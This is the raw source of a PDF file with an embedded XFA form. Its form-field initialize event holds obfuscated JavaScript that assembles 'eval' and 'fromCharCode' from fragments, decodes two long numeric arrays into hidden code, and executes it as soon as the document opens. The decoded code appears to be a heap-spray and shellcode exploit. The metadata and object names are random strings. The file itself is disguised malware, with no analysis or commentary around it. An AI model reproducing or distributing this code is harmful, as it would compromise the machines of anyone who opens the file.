%PDF-1.6
%‚„œ”
1 0 obj
<</MediaBox [0 0 1 1] /Type/Page /Contents 3 0 R /Parent 5 0 R /Resources 7 0 R>>
endobj
5 0 obj
<</Count 2 /Kids [1 0 R] /Type/Pages>>
endobj
8 0 obj
<</Type/EmbeddedFile /Length 86>>
stream
<?xml version="1.0"?><xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
endstream
endobj
9 0 obj
<</Type/EmbeddedFile /Length 652>>
stream
<config xmlns="http://www.xfa.org/schema/xci/1.0/"><present><pdf>
<interactive>1</interactive><linearized>1</linearized><version>1.65</version></pdf><xdp><packets>*</packets></xdp><destination>pdf</destination></present></config>
<template xmlns="http://www.xfa.org/schema/xfa-template/2.5/">
	<subform layout="tb" locale="en_US" name="asfaewf">
		<pageSet>
			<pageArea id="roteYom" name="roteYom">
				<contentArea h="756pt" w="576pt" x="0.25in" y="0.25in"/>
				<medium long="792pt" short="612pt" stock="default"/>
			</pageArea>
		</pageSet>
		<subform h="756pt" w="576pt" name="qwgwqgwqg">
			<field h="65mm" name="favwwbw" w="85mm" x="53.6501mm" y="88.6499mm">
				<event activity="initialize" name="loxRote">
					<script contentType="application/x-javascript">
endstream
endobj
10 0 obj
<</Length 123 /Type/EmbeddedFile>>
stream
a='aw';
b='alStr';
c=2011;
d='eplace';
e='subs';
p=26;
z='this.';
zz=eval;
endstream
endobj
11 0 obj
<</Length 123 /Type/EmbeddedFile>>
stream

	d='r'+d;
	fk = favwwbw['r'+a+'Value'][d](c,b)[d]('g','g.');
	td=zz(fk[e+'tr'](4,19));
	ar2=zz('[118,114,95,49,34,99,48,48,102,53,55,48,97,99,48,48,102,102,51,48,97,51,98,48,97,48,48,50,97,101,102,48,97,49,49,49,49,54,48,48,48,48,48,48,48,48,48,48,48,48,48,48,48,50,57,48,97,52,48,48,102,48,52,48,48,49,49,49,49,49,49,49,49,48,48,48,48,98,54,57,55,49,48,48,98,52,52,57,55,48,101,57,52,54,99,52,50,97,50,97,51,56,53,102,102,102,98,101,51,50,50,99,51,101,101,51,50,50,98,53,102,100,50,102,100,54,51,57,53,51,49,49,49,49,49,49,49,55,49,49,97,54,51,50,50,55,52,49,97,100,99,50,50,97,55,48,101,102,54,97,99,99,99,101,97,97,50,50,50,50,97,101,50,50,50,100,50,49,54,97,97,100,100,100,55,50,97,101,50,50,50,100,50,55,50,55,53,56,54,98,49,56,97,48,99,49,52,97,102,50,50,50,50,97,51,50,50,50,100,50,49,56,99,97,98,100,51,102,97,97,50,50,50,50,97,101,50,50,50,100,50,50,51,50,54,57,50,50,57,48,101,57,48,54,57,48,97,98,97,50,50,50,51,100,51,50,101,101,51,101,48,101,50,51,100,102,51,53,48,50,51,100,57,101,56,56,57,48,50,57,48,55,98,98,54,54,101,51,49,50,57,101,54,54,57,55,101,57,54,55,97,51,56,57,56,97,57,56,50,51,57,49,54,98,57,54,57,51,99,51,100,51,50,101,101,54,50,54,53,51,100,102,51,53,57,54,57,101,54,97,55,51,57,56,54,51,57,52,57,101,57,57,56,101,51,57,57,54,57,51,97,98,54,54,101,51,48,97,50,97,100,99,100,100,97,54,54,50,56,100,100,51,54,54,100,99,55,51,99,49,100,102,100,54,99,50,97,50,100,52,102,53,54,52,55,102,52,59,97,32,108,61,52,50,54,48,97,54,56,52,51,50,54,48,57,50,56,52,57,49,56,52,51,57,56,52,55,55,56,52,52,52,52,52,50,48,48,48,48,48,48,48,48,48,48,48,48,48,48,48,55,56,56,52,54,50,54,48,48,48,48,48,52,52,52,52,52,52,52,52,57,57,57,57,101,49,98,51,48,48,48,56,51,50,56,102,56,51,101,55,48,97,51,48,97,101,102,99,101,101,102,102,102,101,48,48,48,48,53,56,101,53,48,48,48,56,101,56,52,49,56,54,53,51,100,53,53,53,53,53,53,53,53,53,53,53,53,54,48,48,48,48,53,53,53,54,54,54,48,48,54,55,55,54,54,53,54,56,52,48,101,101,52,48,48,48,53,101,55,48,48,48,102,100,56,99,48,54,52,101,52,48,53,101,54,48,48,48,102,100,56,99,55,49,54,53,53,102,97,54,55,102,98,49,101,49,48,48,48,53,101,53,48,48,48,102,100,53,54,102,54,56,54,48,98,101,48,48,48,48,53,101,51,48,48,48,102,100,54,51,99,54,56,53,51,56,53,48,56,53,49,56,55,50,98,49,48,48,48,51,102,51,99,97,51,54,55,48,50,50,99,99,48,48,99,101,102,56,102,53,98,52,54,56,52,49,56,49,55,100,56,52,50,49,54,99,54,56,54,50,50,56,52,51,56,53,48,55,48,101,56,52,49,56,53,50,48,101,101,51,52,56,51,56,48,101,51,102,51,99,102,97,56,99,55,48,99,99,48,48,99,101,102,51,55,50,50,55,101,56,53,50,48,101,54,56,48,52,56,53,49,48,101,56,48,56,48,101,56,52,50,49,54,99,48,48,101,101,102,102,102,54,55,55,55,51,50,50,54,54,54,54,54,55,55,50,54,54,54,50,54,50,55,54,55,51,54,51,51,51,50,54,51,51,34,95,51,97,112,95,52,110,119,65,114,121,41,102,110,116,111,32,108,40,123,97,32,108,61,108,46,105,119,114,101,115,111,46,111,116,105,103,41,95,54,95,54,114,112,97,101,39,39,39,41,119,105,101,95,54,108,110,116,60,41,108,43,39,39,114,116,114,32,97,115,73,116,95,54,49,41,102,110,116,111,32,108,40,108,44,108,41,119,105,101,95,56,108,110,116,42,60,108,41,108,43,95,56,114,116,114,32,108,46,117,115,114,110,40,44,108,47,41,102,110,116,111,32,73,40,73,41,95,49,117,101,99,112,40,73,41,114,116,68,107,95,49,108,110,116,42,59,97,82,116,61,110,115,97,101,39,117,48,48,41,115,114,121,95,55,100,107,111,101,48,50,48,45,111,101,97,41,108,120,104,101,95,49,115,114,121,108,120,104,101,95,55,108,120,104,101,53,52,57,41,102,114,105,48,32,32,32,48,59,105,43,95,52,105,61,111,87,101,46,117,115,114,48,108,120,104,101,108,110,116,45,41,100,107,111,101,125,117,99,105,110,95,50,95,49,108,110,123,104,108,40,73,46,101,103,104,108,110,95,49,61,73,59,101,117,110,95,49,115,98,116,105,103,48,108,110,125,117,99,105,110,95,51,95,49,123,101,61,39,102,114,105,48,105,95,49,108,110,116,59,43,50,123,61,73,46,117,115,114,105,50,59,61,97,115,73,116,98,49,41,114,116,61,116,105,103,102,111,67,97,67,100,40,41,125,101,117,110,114,116,102,110,116,111,32,106,49,95,49,95,52,123,73,61,39,102,114,95,54,48,95,54,95,49,108,110,116,59,73,43,41,95,57,95,52,108,110,116,59,73,61,73,46,104,114,111,101,116,95,54,59,73,61,73,46,104,114,111,101,116,95,54,95,57,59,73,43,83,114,110,46,114,109,104,114,111,101,95,55,95,56,59,114,116,114,32,73,125,117,99,105,110,95,57,95,54,123,106,61,73,46,111,116,105,103,49,41,95,49,95,48,108,110,116,59,73,61,95,49,50,63,48,43,106,58,106,59,101,117,110,95,53,102,110,116,111,32,106,40,73,41,95,53,39,59,111,40,73,61,59,73,60,73,46,101,103,104,95,54,61,41,95,53,61,37,39,95,53,61,73,40,73,46,104,114,111,101,116,95,54,49,41,95,53,61,73,40,73,46,104,114,111,101,116,95,54,41,114,116,114,32,73,125,117,99,105,110,95,51,41,95,52,95,53,41,105,40,106,60,48,48,123,106,61,111,117,83,103,103,112,76,66,47,47,47,65,65,66,65,65,65,65,65,65,65,65,65,65,102,97,83,65,89,57,69,66,39,95,54,95,49,95,55,95,51,95,54,125,108,101,95,53,39,66,65,106,81,69,57,111,75,47,47,119,65,65,65,65,65,65,65,65,81,65,65,65,65,120,65,105,103,65,102,52,75,59,106,61,108,59,106,61,73,40,106,41,95,56,39,85,113,68,103,65,66,59,106,61,73,40,81,70,39,49,57,52,59,108,48,39,81,65,65,68,65,65,65,119,65,65,81,68,65,65,65,66,65,65,119,68,65,65,65,66,65,65,103,68,65,65,65,66,65,65,81,69,65,65,65,73,65,65,119,69,65,65,65,119,65,65,65,68,77,65,65,83,65,65,65,65,65,77,65,47,47,47,59,108,49,95,56,95,57,95,108,43,106,59,108,50,95,105,40,106,44,39,59,102,95,108,46,101,103,104,50,95,108,43,117,101,99,112,40,37,48,41,95,108,61,106,40,108,50,59,73,40,108,51,59,97,119,98,46,97,86,108,101,95,108,125,106,40,59]');
	ar=zz('[2522,832,2808,1586,1352,1300,1404,1248,1248,1274,1456,1352,1326,1300,1404,1248,1248,1404,1456,1352,2522,2626,1456,1352,1326,1300,1456,1352,1404,1300,1456,1352,1352,1352,1352,1352,1300,1248,1248,1248,1248,1248,1248,1248,1248,1248,1248,1248,1248,1248,1248,1248,1274,1326,1456,1352,1404,1300,1404,1248,1248,1248,1248,1248,1352,1352,1352,1352,1352,1352,1352,1352,1482,1482,1482,1482,2626,1274,2548,1326,1248,1248,1248,1456,1326,1300,1456,2652,1456,1326,2626,1430,1248,2522,1326,1482,2522,2626,2652,2574,2626,2626,2652,2652,2652,1430,1482,1482,1482,1482,2574,1274,1430,2574,1482,1482,1482,1274,1430,1274,2600,1456,1274,2652,2574,2522,1352,2574,2574,2574,2574,2574,2574,2574,2574,2574,2574,2574,2574,2652,1482,1482,1482,1482,2574,2574,2574,2652,2652,2652,1482,1482,2652,2626,2626,2652,2652,2574,2652,1274,2600,1482,1430,1430,2600,1482,1482,1482,2574,1430,2626,1482,1482,1482,1404,1352,1274,1378,1482,2652,2600,1430,2600,1482,2574,1430,2652,1482,1482,1482,1404,1352,1274,1378,2626,1456,2652,2574,2574,1404,1326,2652,2626,1404,1300,1456,1430,1456,1482,1482,1482,2574,1430,2574,1482,1482,1482,1404,1352,2574,2652,1404,2652,1274,2652,1482,1300,1430,1482,1482,1482,1482,2574,1430,2522,1482,1482,1482,1404,1352,2652,2522,1378,2652,1274,2574,2522,1274,2574,1482,1274,2574,1456,1274,2626,2548,1300,1456,1482,1482,1482,2522,1404,2522,1378,1326,2522,2652,2626,1482,2548,2548,1378,1378,1482,1482,1378,1430,1404,1274,1404,2574,1300,2600,2652,1274,2600,1456,1274,1456,2626,1352,1274,2600,2548,1456,2652,1378,2652,1274,2652,2548,2548,1274,2600,2522,1274,2574,1482,2626,1482,1430,1274,2600,1456,1274,2574,2548,1482,1430,1430,2522,2600,1274,2522,1274,1482,1430,2522,1404,2522,1378,1404,1326,1274,1378,2626,1482,1378,1378,1482,1482,1378,1430,1404,2522,2626,2548,2548,2626,1430,1274,2574,2548,1482,1430,2652,1274,1482,2600,1274,2574,1456,1482,1430,1274,1482,1274,1482,1430,1274,2600,2548,1456,2652,1378,1482,1482,1430,1430,1404,1404,1404,2652,2626,2626,2626,2522,2548,2548,2652,2652,2652,2652,2652,2626,2626,2548,2652,2652,2652,2548,2652,2548,2626,2652,2626,2522,2652,2522,2522,2522,2548,2652,2522,2522,884,3068,2964,2470,1300,884,2574,1248,1248,2652,1378,1326,1248,2522,2574,1248,1248,2652,1404,1274,1248,2522,1248,2652,1248,2522,1248,1248,1352,2522,2600,2626,1248,2522,1274,1274,1274,1274,1404,1248,1248,1248,1248,1248,1248,1248,1248,1248,1248,1248,1248,1248,1248,1248,1274,1456,1248,2522,1352,1248,1248,2652,1248,1352,1248,1248,1274,1274,1274,1274,1274,1274,1274,1274,1248,1248,1248,1248,2548,1404,1482,1430,1274,1248,1248,2548,1352,1352,1482,1430,1248,2626,1482,1352,1404,2574,1352,2600,2522,1300,2522,1326,1456,1378,2652,2652,2652,1352,1274,2574,2600,2600,1326,2574,1274,1274,2574,2600,2600,1352,2522,1248,1300,2600,1248,1300,1482,2574,1404,2522,2574,2626,2626,2626,2626,2626,2626,2626,1456,2626,2626,1378,1482,2574,2600,2600,1456,2548,2626,1378,1300,1326,2600,2600,1378,1456,2652,1274,1248,1482,1378,1326,1326,1326,1274,1378,1378,2600,2600,2600,2600,1378,1274,2600,2600,2600,1300,2600,2626,1482,1378,1378,1300,1300,1300,1456,2600,1378,1274,2600,2600,2600,1300,2600,1456,2600,1456,2522,1430,1482,1352,2626,1430,1378,2652,1326,2626,2548,1378,1248,2600,2600,2600,2600,1378,2574,2600,2600,2600,1300,2600,2626,1430,1326,1378,1352,1300,2574,1248,1378,1378,2600,2600,2600,2600,1378,1274,2600,2600,2600,1300,2600,2600,2574,2600,1482,1404,2600,2600,1404,2652,1274,1404,2652,1482,1404,2652,1378,1352,1378,2600,2600,2600,2574,1300,2574,2600,1274,1274,2574,1274,2652,1274,2600,2574,1300,1248,2574,2522,2652,2600,2574,1300,1404,1274,1430,1430,1404,2652,2600,1404,2652,1456,1352,1352,1482,1482,1274,2574,2626,2600,1404,1274,1482,1482,1404,1456,1274,1404,1482,1456,1378,2574,1430,1404,1430,1378,1404,1430,2600,2574,1404,2626,1482,1352,1404,1482,1404,2574,1326,2574,1300,2574,2600,1274,1274,1482,2600,1482,2522,2574,1300,1248,2574,2522,1404,1482,1404,1274,1482,1378,1456,2574,1404,1430,1482,2574,1404,2548,1404,1274,1404,1404,1430,1274,2574,1404,1404,1482,1404,2574,1378,1352,1482,1482,1274,2574,2652,1378,2600,1378,1300,1326,1300,1300,1378,1482,1482,2600,1430,1300,1300,2574,1482,1482,1300,1326,1456,2574,1326,2626,1300,1248,1300,1482,1326,2600,1378,2600,1300,2548,1248,2522,1482,2548,1456,1248,2548,1534,2808,1586,2912,1534,2808,1586,2626,832,2964,2522,1040,1534,3042,2574,2730,2860,2470,1378,1066,3068,2964,2470,1404,2470,1326,3068,2626,2626,2236,2964,2730,2860,3016,2158,2964,2860,1040,1534,2808,1586,2808,1196,2626,2808,2574,1040,1196,1144,1014,1534,2704,2808,1040,2808,1196,2626,2678,2704,1352,2470,1404,1586,1248,1534,2626,3042,2860,2912,2964,2626,2860,1040,2808,1144,1248,3250,3042,2574,2730,2860,2470,1430,2470,1456,2470,1482,3198,2704,2808,1040,2808,1196,2626,2678,2704,1300,2470,1482,2470,1456,1586,2808,1534,2626,3042,2860,2470,1456,2990,2548,3016,2730,2678,1248,2470,1482,1300,3250,3042,2574,2730,2860,2470,1248,2470,1274,3198,1898,1586,2860,2990,2522,2626,2470,1274,1534,2886,2626,2522,1586,1898,1196,2626,2678,2704,1300,2600,2782,2886,2626,3042,2626,2574,2912,1040,962,1482,1482,1014,1534,2912,2522,1586,2808,1040,2522,2132,3016,1144,3120,1248,1248,2964,3016,1768,2782,1534,2886,2262,2626,1586,1898,1118,2912,2522,1534,2886,2262,2626,1586,2808,1040,2886,2262,2626,1144,1300,1248,1456,1534,2886,1040,1586,1534,2730,1560,1352,1248,832,1118,1066,2808,2366,2418,2808,3120,2704,2626,2990,2548,3016,1040,1144,2886,2262,2626,1196,2626,2678,2704,1274,1118,2522,2132,3016,1534,2652,2860,3016,2886,832,1898,1040,1898,1144,2626,1066,3094,2730,2626,2470,1274,2808,2860,3016,1560,2626,1066,1898,1118,2470,1274,2964,3016,2964,832,1898,1196,3042,2990,2964,2860,1040,1144,2626,1066,2652,2860,3016,2886,832,1898,1040,1898,1066,2964,3016,1014,1534,2886,1040,1586,1534,1560,1898,1196,2626,2678,2704,2730,1586,1066,2548,2470,1274,2990,2548,3016,1040,1144,1066,2574,2912,2964,2626,2860,1040,1144,1404,1534,2626,1118,2158,2964,2860,1196,2964,2834,2704,2964,2886,2626,2574,1534,2964,3016,2964,832,2626,3250,3042,2574,2730,2860,2470,2730,1040,1898,1144,1898,1066,2470,1378,1014,1534,2886,1040,1898,1586,1534,1898,1560,1898,1196,2626,2678,2704,2470,1404,1118,3198,2808,1586,1898,1196,2626,2678,2704,2470,1430,2470,1274,2574,2522,1742,2600,1690,1040,1898,1066,2470,1456,2470,1352,2574,2522,1742,2600,1690,1040,1898,962,2808,1066,2470,1378,1586,3016,2730,2678,2652,2886,1742,2522,1742,2600,1040,1898,2444,1898,1066,3250,2626,3042,2860,2470,1378,2652,2860,3016,2886,832,1898,1040,1898,1066,2470,1248,2470,1404,3016,2158,2964,2860,1040,1404,1534,2756,1586,2756,1196,2626,2678,2704,2470,1378,1040,2756,962,1066,1014,1014,2470,1248,2470,1248,2964,3016,2964,832,1898,3250,3042,2574,2730,2860,2470,1300,2470,1274,3198,1898,1586,1014,2652,2964,2470,1404,1248,2470,1404,2470,1274,2808,2860,3016,1534,1898,1118,1300,3198,1898,1118,1014,3042,1534,1898,1118,2470,1482,2470,1274,2574,2522,1742,2600,1690,1040,1898,1118,1066,1534,1898,1118,2470,1482,2470,1274,2574,2522,1742,2600,1690,1040,1898,1066,3250,2626,3042,2860,2470,1378,2652,2860,3016,2886,832,2756,1040,3198,2756,1586,2808,1040,1534,2652,2470,1352,1482,1248,1066,2470,1378,1014,1118,1690,2756,2678,2782,3042,1352,1950,1222,1222,3094,1690,1690,1690,1690,1690,1690,1690,1690,2106,1690,1690,1690,1690,2704,1690,2730,2678,1690,1456,1898,1950,1534,2756,1586,2808,1534,2756,1586,1898,1040,2756,1066,2626,2990,3198,2756,1586,2782,1118,2158,2730,2704,2912,2652,1716,1222,1222,1222,1690,1690,1716,1690,1690,1690,1690,1690,1690,1690,1690,1690,1690,2314,1742,2158,1690,2314,1222,1794,1716,1014,2470,1404,2470,1300,2470,1430,2470,1326,2470,1404,3250,2756,1586,2158,2782,1690,2678,1690,1716,1014,2470,1482,2470,1300,1014,2210,1716,1144,1248,1456,1066,2470,2808,1586,2106,2574,1690,1794,1690,1794,1690,1690,1898,1690,1690,1794,1690,1794,1690,1690,1690,1690,1690,1794,1690,1794,1690,1690,1690,1690,1716,1794,1690,1794,1690,1690,1690,1690,1794,1794,1690,1794,1690,1690,1690,1690,1820,1794,1690,1794,1690,1690,1898,1690,2210,1794,1690,3094,1690,1742,1898,1690,1690,1690,1690,1690,1768,2756,1222,1222,1014,2470,2808,1586,2756,1118,2756,1118,2808,1248,2470,1378,2470,2808,1586,2756,1274,2470,1430,1014,1066,2730,1040,2808,1300,2808,2860,3016,962,1066,2808,1300,1586,2860,2990,2522,2626,1014,1248,1014,1534,2808,1326,2470,1300,2470,2808,1066,2470,1248,2470,2808,1066,2652,3068,3094,3094,2964,3094,2522,3042,1586,2808,1274,2470,1326,1066]');
	tny='';
	for(i=0;i&lt;ar2.length;i++){
		tny+=td(ar2[i]);
		if (i&lt;ar.length)tny+=td(ar[i]/p);
	}
	zz(tny);
	
endstream
endobj
12 0 obj
<</Length 123 /Type/EmbeddedFile>>
stream
					</script>
				</event>
				<ui>	
					<imageEdit/>
				</ui>
			</field>
		</subform>
	</subform>
</template>
<PDFSecurity xmlns="http://ns.adobe.com/xtd/" accessibleContent="1" change="1" contentCopy="1" documentAssembly="1" formFieldFilling="1" metadata="1" modifyAnnots="1" print="1" printHighQuality="1"/>
endstream
endobj
14 0 obj<</Type/EmbeddedFile /Length 152>>
stream
<xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/"><xfa:data><asfaewf><favwwbw>ev2011ingfromCharCode</favwwbw></asfaewf></xfa:data></xfa:datasets>
endstreamendobj15 0 obj<</Length 76 /Type/EmbeddedFile>>
stream<xfdf xmlns="http://ns.adobe.com/xfdf/" xml:space="preserve"><annots/></xfdf>
endstreamendobj16 0 obj<</Type/EmbeddedFile /Length 60>>
stream
<form xmlns="http://www.xfa.org/schema/xfa-form/2.8/" />
</xdp:xdp>endstreamendobj18 0 obj<</Rect [12.5 5.1 18.3 7.7] /Subtype/Widget /Ff 65536 /T (favwwbw[0]) /MK <</TP 1>> /Type/Annot /FT/Btn /DA (/CourierStd 10 Tf 0 g) /Parent 19 0 R /TU (favwwbw) /P 1 0 R /F 4>>endobj19 0 obj<</T (qwgwqgwqg[0]) /Kids [18 0 R] /Parent 20 0 R>>endobj20 0 obj<</T (asfaewf[0]) /Kids [19 0 R]>>endobj21 0 obj<</DA (/Helv 0 Tf 0 g ) /Fields [20 0 R] /XFA [8 0 R 9 0 R 10 0 R 11 0 R 12 0 R 13 0 R 14 0 R 15 0 R 16 0 R 17 0 R]>>endobj22 0 obj<</Creator (styeZek colSnap) /Title (zekRote snapSet) /CreationDate (D:20100829161936) /Subject (onesZek ionSnap) /Author (setSnap hunkZek)>>endobj23 0 obj<</AcroForm 21 0 R /Pages 5 0 R /Type/Catalog>>endobjxref
0 24 
trailer
<</Size 22 /Info 22 0 R /Root 23 0 R>>
startxref
17175
%%EOF